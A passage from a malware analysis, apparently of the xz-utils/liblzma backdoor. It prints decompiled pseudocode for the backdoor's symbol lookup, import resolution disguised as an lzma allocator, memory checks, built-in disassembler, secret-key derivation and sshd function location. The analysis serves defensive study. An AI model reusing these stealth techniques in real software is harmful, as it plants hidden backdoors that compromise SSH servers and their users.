                if ( !v37 || validate_memory_range(elf_info, v37, 20 * elf_info->verdefnum, PF_R) )
                {
                  // https://flapenguin.me/elf-dt-gnu-hash
                  nbuckets = dt_gnuhash_value->nbuckets;
                  elf_info->gnuhash_nbuckets = nbuckets;
                  bloom_size = dt_gnuhash_value->bloom_size;
                  symoffset = dt_gnuhash_value->symoffset;
                  elf_info->gnuhash_bloom_size = bloom_size - 1;
                  bloom_shift = dt_gnuhash_value->bloom_shift;
                  elf_info->gnuhash_bloom_start = &dt_gnuhash_value->bloom_start;
                  buckets_start = (&dt_gnuhash_value->bloom_start + bloom_size);
                  elf_info->gnuhash_bloom_shift = bloom_shift;
                  elf_info->gnuhash_buckets = buckets_start;
                  elf_info->gnuhash_chain = &buckets_start[nbuckets - symoffset];
                  return Success;
                }
              }
            }
          }
        }
      }
    }
    return Error;
  }
  return Error;
}
```

This information is used, for example, in the `import_lookup` function
(where the `Elf64_Sym *result` is obtained by traversing the GNU Hash ELF section).

```c
Elf64_Sym *__fastcall import_lookup(elf_info_t *elf_info, int import_sid, int lib_sid)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  if ( secret_data_update_for_ret(0x58u, 0xFu, 3u, 0) && (!lib_sid || (elf_info->custom_flags & 0x18) == 0x18) )
  {
    current_bucket = 0;
_next:
    if ( current_bucket < elf_info->gnuhash_nbuckets )
    {
      bucket = &elf_info->gnuhash_buckets[current_bucket];
      if ( validate_memory_range(elf_info, bucket, 4uLL, PF_R) )
      {
        v15 = &elf_info->gnuhash_chain[*bucket];
        if ( validate_memory_range(elf_info, v15, 8uLL, PF_R) )
        {
          while ( 1 )
          {
            item = ((v15 - elf_info->gnuhash_chain) >> 2);
            sym = &elf_info->dynsym[item];
            if ( validate_memory_range(elf_info, sym, 0x18uLL, PF_R) == Error )
              break;
            if ( sym->st_value && sym->st_shndx )
            {
              name = (elf_info->dynstr + sym->st_name);
              if ( validate_memory_range(elf_info, name, 1uLL, PF_R) == Error )
                return 0LL;
              if ( reverse_trie_lookup(name, 0LL) == import_sid )
              {
                if ( !lib_sid )
                  return sym;
                v8 = &elf_info->gnu_version[item];
                if ( validate_memory_range(elf_info, v8, 2uLL, PF_R) == Error )
                  return 0LL;
                v9 = *v8;
                if ( (elf_info->custom_flags & 0x18) == 24 && (v9 & 0x7FFE) != 0 )
                {
                  verdef = elf_info->verdef;
                  vd_ndx = v9 & 0x7FFF;
                  for ( i = 0;
                        i < elf_info->verdefnum
                     && validate_memory_range(elf_info, verdef, 0x14uLL, PF_R)
                     && verdef->vd_version == 1;
                        ++i )
                  {
                    if ( vd_ndx == verdef->vd_ndx )
                    {
                      v12 = verdef + verdef->vd_aux;
                      if ( validate_memory_range(elf_info, v12, 8uLL, PF_R) == Error )
                        break;
                      v13 = (elf_info->dynstr + *v12);
                      if ( validate_memory_range(elf_info, v13, 1uLL, PF_R) == Error )
                        break;
                      if ( lib_sid == reverse_trie_lookup(v13, 0LL) )
                        return sym;
                    }
                    vd_next = verdef->vd_next;
                    if ( !vd_next )
                      break;
                    verdef = (verdef + vd_next);
                  }
                }
              }
            }
            v15 += 4;
            if ( (*(v15 - 4) & 1) != 0 )
            {
              ++current_bucket;
              goto _next;
            }
          }
        }
      }
    }
  }
  return 0LL;
}
```

## Import resolution via lzma allocator

In order to obfuscate function calls that perform import resolution, the backdoor abuses the `liblzma` allocator API.

The `lzma` allocator allows one to specify custom functions to perform allocation and destruction via the following structure:

```c
typedef struct {
  void *(LZMA_API_CALL *alloc)(void *opaque, size_t nmemb, size_t size);
  void (LZMA_API_CALL *free)(void *opaque, void *ptr);
  void *opaque;
} lzma_allocator;
```

The backdoor uses `get_lzma_allocator`, to obtain a pointer to `g_fake_lzma_allocator`, which contains the backdoor's custom "allocator".

The pseudocode of `get_lzma_allocator` function is shown below:

```c
lzma_allocator *__fastcall get_lzma_allocator()
{
  return (get_lzma_allocator_addr() + 8);
}

uint8_t *__fastcall get_lzma_allocator_addr()
{
  int i; // [rsp+1Ch] [rbp-Ch]
  uint8_t *addr; // [rsp+20h] [rbp-8h]

  addr = g_fake_lzma_allocator_s180h_addr;
  for ( i = 0; i <= 11; ++i )
    addr += 32;
  return addr;
}
```

This function will return `lzma_allocator <offset _import_lookup_st_value, offset bd_lzma_free, offset decode_insns>`:

```
.data.rel.ro.lookup_filter.part.0:000000000000CAE8 g_fake_lzma_allocator_s180h_addr dq offset g_fake_lzma_allocator-180h
...
.data.rel.ro.decoders0:000000000000CAF0 g_fake_lzma_allocator dq 22h
.data.rel.ro.decoders0:000000000000CAF8 ; lzma_allocator
.data.rel.ro.decoders0:000000000000CAF8                 lzma_allocator <offset _import_lookup_st_value, offset bd_lzma_free, \
.data.rel.ro.decoders0:000000000000CAF8                                 offset decode_insns>
```

The backdoor populates `alloc`, `free` and `opaque` with the following values:

- `alloc`: `import_lookup_st_value`
- `free`: `bd_lzma_free` (this function does nothing in the backdoor code)
- `opaque`: `decode_insns`

Thus, a call to `lzma_alloc(value, lzma_allocator)`, will result in a call to `import_lookup_st_value` with arguments (`opaque`, `nmemb`, `value`),
where pseudocode of `import_lookup_st_value` is shown below:

```c
Elf64_Sym *__fastcall import_lookup_st_value(elf_info_t *elf_info, size_t nmemb, int import_sid)
{
  return import_lookup_st_value(elf_info, import_sid);
}

Elf64_Sym *__fastcall import_lookup_ex(elf_info_t *elf_info, int import_sid)
{
  Elf64_Sym *sym; // rax
  Elf64_Addr st_value; // rdx

  sym = import_lookup(elf_info, import_sid, 0);
  if ( sym )
  {
    st_value = sym->st_value;
    if ( st_value && sym->st_shndx )
      return (st_value + elf_info->ehdr);
    else
      return 0LL;
  }
  return sym;
}
```

When `opaque` is set to `elf_info* elf_info`, and `size` is set to string identifier,
`lzma_alloc` will return the address of the imported function.

Examples of use:

```c
// .text.lzma_index_buffer_encoda:00000000000045D0
Status __fastcall resolve_read_and_errno_location(Elf64_Ehdr **p_elf, elf_info_t *elf_info, imports_struct *imports)
{
  lzma_allocator *lzma_allocator; // r13
  Status result; // eax
  uint64_t read; // rax
  uint64_t import; // rax

  lzma_allocator = get_lzma_allocator();
  result = parse_elf(*p_elf, elf_info);
  if ( result )
  {
    lzma_allocator->opaque = elf_info;
    read = lzma_alloc(STR_read_, lzma_allocator);
    imports->read = read;
    if ( read )
      ++imports->count;
    import = lzma_alloc(STR___errno_location_, lzma_allocator);
    imports->__errno_location = import;
    if ( import )
      ++imports->count;
    return imports->count == 2;
  }
  return result;
}
```

```c
// .text.lzma_lz_encoder_memusaga:0000000000002540
Status __fastcall resolve_imports(uint64_t *dst_addr, elf_info_t *elf_info, elf_info_t *einfo, hfuncs_t *crypto_funcs)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  size = 0LL;
  lzma_allocator = get_lzma_allocator();
  lzma_allocator->opaque = einfo;
  allocator = lzma_allocator;
  base = get_code_start_and_size(elf_info, &size);
  if ( base )
  {
    start = base;
    end = base + size;
    EVP_PKEY_new_raw_public_key = lzma_alloc(STR_EVP_PKEY_new_raw_public_key_, allocator);
    ...
    lzma_free(crypto_funcs->EVP_PKEY_new_raw_public_key, allocator, insn_size);
  }
  return Error;
}
```

## Memory validation

The backdoor uses the `validate_memory_range` function to check the validity of memory ranges. We see its use in `import_lookup` with the use of the `PF_R` flag, for example, to check for permission to read.

```c
Status __fastcall validate_memory_range(elf_info_t *elf_info, uint8_t *address, size_t size, uint32_t p_flags)
{
  return validate_memory_range_with_depth(elf_info, address, size, p_flags, 0LL);
}

Status __fastcall validate_memory_range_with_depth(
        elf_info_t *elf_info,
        uint8_t *addr,
        size_t size,
        uint32_t p_flags,
        uint64_t depth)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  ehdr = elf_info->ehdr;
_start:
  depth = (depth + 1);
  end = &addr[size];
  if ( !size )
    return Success;
  current = &addr[size];
  if ( addr <= end )
    current = addr;
  if ( current >= ehdr && depth != 0x3EA )
  {
    for ( i = 0LL; i < LOWORD(elf_info->e_phnum); ++i )
    {
      phdr = (elf_info->program_headers + 56 * i);
      if ( phdr->__p_type == PT_LOAD && (p_flags & phdr->p_flags) == p_flags )
      {
        v12 = &ehdr->e_ident[phdr->p_vaddr - elf_info->first_pt_load_vaddr];
        v13 = v12 + phdr->p_memsz;
        v14 = v12 & 0xFFFFFFFFFFFFF000LL;
        if ( (v13 & 0xFFF) != 0 )
          v13 = (v13 & 0xFFFFFFFFFFFFF000LL) + 0x1000;
        if ( addr >= v14 && v13 >= end )
          return Success;
        if ( v13 < end || addr >= v14 )
        {
          if ( addr >= v13 || addr < v14 )
          {
            if ( v13 < end && addr < v14 )
            {
              depth0 = depth;
              result = validate_memory_range_with_depth(elf_info, addr, v14 - addr, p_flags, depth);
              if ( result )
                return validate_memory_range_with_depth(elf_info, (v13 + 1), &end[-v13 - 1], p_flags, depth0) != Error;
              return result;
            }
          }
          else if ( v13 < end )
          {
            addr = (v13 + 1);
            size = &end[-v13 - 1];
            goto _start;
          }
        }
        else if ( v14 < end )
        {
          size = v14 - addr - 1;
          goto _start;
        }
      }
    }
  }
  return Error;
}
```

The backdoor also uses `pselect` to check if a given range is mapped:

```c
Status __fastcall is_mapped_range(uint8_t *addr, size_t size, all_t *api_ctx)
{
  const sigset_t *sigmask; // rbx
  standard_funcs_t *standard; // rax
  int (__fastcall *pselect)(int, fd_set *, fd_set *, fd_set *, const struct timespec *, const sigset_t *); // rax
  void **errno; // rax
  timespec timeout; // [rsp+0h] [rbp-38h] BYREF

  if ( !size )
    return 0;
  if ( addr <= 0xFFFFFF )
    return Error;
  sigmask = (addr & 0xFFFFFFFFFFFFF000LL);
  if ( (addr & 0xFFFFFFFFFFFFF000LL) < &addr[size] )
  {
    timeout.tv_sec = 0LL;
    if ( api_ctx )
    {
      while ( 1 )
      {
        standard = api_ctx->standard;
        if ( !standard )
          break;
        if ( !standard->__errno_location )
          break;
        pselect = standard->pselect;
        if ( !pselect )
          break;
        timeout.tv_nsec = 1LL;
        if ( pselect(1, 0LL, 0LL, 0LL, &timeout, sigmask) < 0 )
        {
          errno = (api_ctx->standard->__errno_location)(1LL);
          if ( *errno == EFAULT || !sigmask )
          {
            *errno = 0;
            return Error;
          }
        }
        sigmask += 1024;
        if ( sigmask >= &addr[size] )
          return Success;
        timeout.tv_sec = 0LL;
      }
    }
    return Error;
  }
  return Success;
}
```

## Disassembler

To search for specific addresses, instructions, string references, the backdoor implements a simplified x86 disassembler.

The function performing disassembly can be found at `.text.x86_codd:0000000000000010` in analysed object file:

```c
Status decode_insns(insn_t *insn, uint8_t *start_ea, uint8_t *end_ea);
```

The partially reconstructed `insn_t` structure is documented in [4].
Note that the `xzre` project allows us to test disassembler on an arbitrary data ([5]).

An example of the backdoor using its disassembler is shown below:

```c
Status __fastcall find_lea_displ(uint8_t *start_ea, uint8_t *end_ea, insn_t *insn, uint64_t lea_displ)
{
  uint32_t *insn_p; // rdi
  size_t i; // rcx
  insn_t insna; // [rsp+8h] [rbp-80h] BYREF

  if ( secret_data_update_for_ret(0x1C8u, 0, 0x1Eu, 0) )
  {
    insn_p = &insna;
    for ( i = 22LL; i; --i )
      *insn_p++ = 0;
    if ( !insn )
      insn = &insna;
    while ( start_ea < end_ea )
    {
      if ( decode_insns(insn, start_ea, end_ea)
        && insn->opcode == INSN_LEA0
        && (insn->rex_b & 0x48) == 0x48
        && (*&insn->mod_rm & 0xFF00FF00) == 0x5000000
        && (!lea_displ || insn->mem_displ + insn->addr + insn->insn_size == lea_displ) )
      {
        return 1;
      }
      ++start_ea;
    }
  }
  return Error;
}
```

## Secret data

To obtain the ED448 public key used in main hook function, the backdoor relies on `ctx->secret_data`:

```c
Status __fastcall decrypt_secret_data(uint8_t *out, global_ctx *ctx)
{
  hfuncs_t *hfuncs; // r9
  size_t i; // rcx
  uint32_t *dptr1; // rdi
  size_t j; // rcx
  uint32_t *dptr2; // rdi
  uint8_t key1[32]; // [rsp-20h] [rbp-B8h] BYREF
  uint8_t iv1[16]; // [rsp+0h] [rbp-98h] BYREF
  uint8_t key2[32]; // [rsp+10h] [rbp-88h] BYREF
  uint8_t iv2[16]; // [rsp+30h] [rbp-68h] BYREF

  if ( !out )
    return 0;
  if ( ctx )
  {
    hfuncs = ctx->hfuncs;
    if ( hfuncs )
    {
      i = 0xCLL;
      dptr1 = key1;
      while ( i )
      {
        *dptr1++ = 0;
        --i;
      }
      j = 0x1CLL;
      dptr2 = key2;
      while ( j )
      {
        *dptr2++ = 0;
        --j;
      }
      if ( chacha20_decrypt(key1, 0x30uLL, key1, iv1, key2, hfuncs) )
        return chacha20_decrypt(ctx->secret_data, 0x39uLL, key2, iv2, out, ctx->hfuncs) != Error;
    }
  }
  return Error;
}

Status __fastcall hook_main(RSA *r, global_ctx *ctx, uint32_t *status) {
  ...
  // check that ctx->secret_data will have the expected value
  if ( ctx->reg2reg_insn_count == 0x1C8 )
  {
    header_value = modulus.magic_params;
    // decrypt g_ctx->secret_data to get ed448_public_key
    if ( decrypt_ed448_public_key(ed448_public_key, ctx) )
    {
      // decrypt ciphertext using ed448_public_key[:32] as a key
      // and a, b, c as an IV
      if ( chacha20_decrypt(
              modulus.ciphertext.signature,
              n_bytes_count - 16,
              ed448_public_key,
              &header_value,
              modulus.ciphertext.signature,
              ctx->hfuncs) )
      ...
    }
    ...
  }
  ...
}
...
```

`ctx->secret_data` is a byte array of size `0x39` (57); its content is dependent on the backdoor's code.

Below are some of the functions that relate to this field:

```c
Status __fastcall secret_data_update(
        uint8_t *value,
        uint8_t *address,
        uint32_t shift_cursor,
        uint32_t reg2reg_insn_count,
        uint32_t operation_index)
{
  global_ctx *ctx; // rax
  uint8_t *call_site; // [rsp+8h] [rbp-30h] BYREF

  call_site = 0LL;
  ctx = g_ctx;
  if ( g_ctx && !g_ctx->shift_operations[operation_index] )
  {
    g_ctx->shift_operations[operation_index] = 1;
    if ( search_func_start_with(address, &call_site, 0LL, ctx->liblzma_code_start, ctx->liblzma_code_end, FIND_NOP) == Error
      || secret_data_update_with_check(
           call_site,
           g_ctx->liblzma_code_end,
           shift_cursor,
           reg2reg_insn_count,
           value == 0LL) == Error )
    {
      return Error;
    }
    g_ctx->reg2reg_insn_count += reg2reg_insn_count;
  }
  return Success;
}

Status __fastcall secret_data_update_with_check(
        uint8_t *start_ea,
        uint8_t *end_ea,
        uint32_t shift_cursor,
        uint32_t reg2reg_insn_count,
        uint32_t update_ea)
{
  __int64 sz; // rcx
  uint32_t *insn_p; // rdi
  size_t insn_count; // r12
  uint32_t cursor; // [rsp+Ch] [rbp-9Ch] BYREF
  insn_t insn; // [rsp+18h] [rbp-90h] BYREF

  sz = 22LL;
  insn_p = &insn;
  while ( sz )
  {
    *insn_p++ = 0;
    --sz;
  }
  cursor = shift_cursor;
  if ( update_ea )
  {
    if ( !get_call_target(start_ea, end_ea, 0LL, &insn) )
      return 0;
    start_ea = (insn.addr + insn.insn_size);
  }
  insn_count = 0LL;
  while ( find_reg2reg_insn(start_ea, end_ea, &insn) )
  {
    if ( insn_count == reg2reg_insn_count )
    {
      if ( reg2reg_insn_count < insn_count )
        return 0;
      return reg2reg_insn_count == insn_count;
    }
    ++insn_count;
    if ( secret_data_update_with_cursor(&insn, &cursor) == Error )
      return 0;
    start_ea = (insn.addr + insn.insn_size);
  }
  return reg2reg_insn_count == insn_count;
}

Status __fastcall secret_data_update_with_cursor(insn_t *insn, uint32_t *cursor)
{
  uint32_t index; // eax
  InsnOpcodes opcode; // ecx
  uint32_t opcode_value; // ecx

  index = *cursor;
  if ( *cursor <= 0x1C7 )
  {
    opcode = insn->opcode;
    if ( opcode != INSN_MOV0 && opcode != INSN_CMP0 )
    {
      opcode_value = opcode - 0x83;
      if ( opcode_value > 0x2E || ((0x410100000101uLL >> opcode_value) & 1) == 0 )
        // g_ctx->secret_data[index.byte_index] |= 1 << index.bit_index
        g_ctx->secret_data[index >> 3] |= 1 << (index & 7);
    }
    *cursor = index + 1;
  }
  return Success;
}
```

The `secret_data_update` function is called many times during the backdoor's initialisation process.

Note that if the backdoor's code is changed, `ctx->secret_data` (and hence the ED448 public key) will likely no longer the same, and the backdoor will cease to function correctly with this key. Clearly, the threat actors responsible intended to use different keys for different versions of the backdoor.

## Strings references

During the initialisation routine, the backdoor is stores 27 instances of `string_ref_t`:

```c
struct string_refs_t
{
  string_ref_t refs[27];
};


struct string_ref_t
{
  BackdoorStrings sid;
  uint32_t reserved;
  uint8_t *code_start;
  uint8_t *code_end;
  uint8_t *xref;
};
```

The index to `BackdoorStrings` map is shown below:

```c
enum IndexToSid
{
  I2S_xcalloc__zero_size_ = 0x0,
  I2S_Could_not_chdir_to_home_directory__s___s__ = 0x1,
  I2S_list_hostkey_types_ = 0x2,
  I2S_demote_sensitive_data_ = 0x3,
  I2S_mm_terminate_ = 0x4,
  I2S_mm_pty_allocate_ = 0x5,
  I2S_mm_do_pam_account_ = 0x6,
  I2S_mm_session_pty_cleanup2_ = 0x7,
  I2S_mm_getpwnamallow_ = 0x8,
  I2S_mm_sshpam_init_ctx_ = 0x9,
  I2S_mm_sshpam_query_ = 0xA,
  I2S_mm_sshpam_respond_ = 0xB,
  I2S_mm_sshpam_free_ctx_ = 0xC,
  I2S_mm_choose_dh_ = 0xD,
  I2S_sshpam_respond_ = 0xE,
  I2S_sshpam_auth_passwd_ = 0xF,
  I2S_sshpam_query_ = 0x10,
  I2S_start_pam_ = 0x11,
  I2S_mm_request_send_ = 0x12,
  I2S_mm_log_handler_ = 0x13,
  I2S_Could_not_get_agent_socket_ = 0x14,
  I2S_auth_root_allowed_ = 0x15,
  I2S_mm_answer_authpassword_ = 0x16,
  I2S_mm_answer_keyallowed_ = 0x17,
  I2S_mm_answer_keyverify_ = 0x18,
  I2S___48s___48s____d__pid__ld__ = 0x19,
  I2S_Unrecognized_internal_syslog_level_code__d__ = 0x1A,
};
```

These entries are used to identify the start and end of the functions mapped from specific strings:

```c
sshlogv_func_start = string_refs.refs[I2S___48s___48s____d__pid__ld__].code_start;
if ( string_refs.refs[I2S___48s___48s____d__pid__ld__].code_start )
{
  if ( !all->g_ctx.sshd_main_verified
    || is_endbr64(
          string_refs.refs[I2S___48s___48s____d__pid__ld__].code_start,
          (string_refs.refs[I2S___48s___48s____d__pid__ld__].code_start + 4),
          0xE230) )
  {
    counter = 22;
    ssh_logs->func_sshlogv = sshlogv_func_start;
    p_insn = &insn;
    while ( counter )
    {
      *p_insn++ = 0;
      --counter;
    }
    ...
  }
  ...
}
```

# Additional References

- https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504
- https://github.com/amlweems/xzbot
- https://github.com/smx-smx/xzre
- https://twitter.com/bl4sty/status/1776691497506623562
- https://github.com/blasty/JiaTansSSHAgent

[1]: https://gynvael.coldwind.pl/?lang=en&id=782
[2]: https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01
[3]: https://en.wikipedia.org/wiki/Radix_tree
[4]: https://github.com/smx-smx/xzre/blob/main/xzre.h
[5]: https://github.com/smx-smx/xzre/blob/ff3ba18a39bad272ff628bb759ed5c897cf441b3/xzre.c#L48
